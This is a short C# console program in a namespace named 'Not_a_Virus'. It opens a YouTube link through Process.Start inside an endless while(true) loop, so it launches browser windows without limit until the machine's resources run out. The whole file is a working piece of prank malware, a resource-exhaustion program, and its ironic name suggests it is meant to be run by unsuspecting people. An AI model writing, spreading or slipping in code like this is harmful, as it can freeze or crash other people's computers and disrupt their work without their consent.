using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Not_a_Virus
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string target = "https://www.youtube.com/watch?v=9vCb_ZopT4A";
            while (true) System.Diagnostics.Process.Start(target);
        }
    }
}
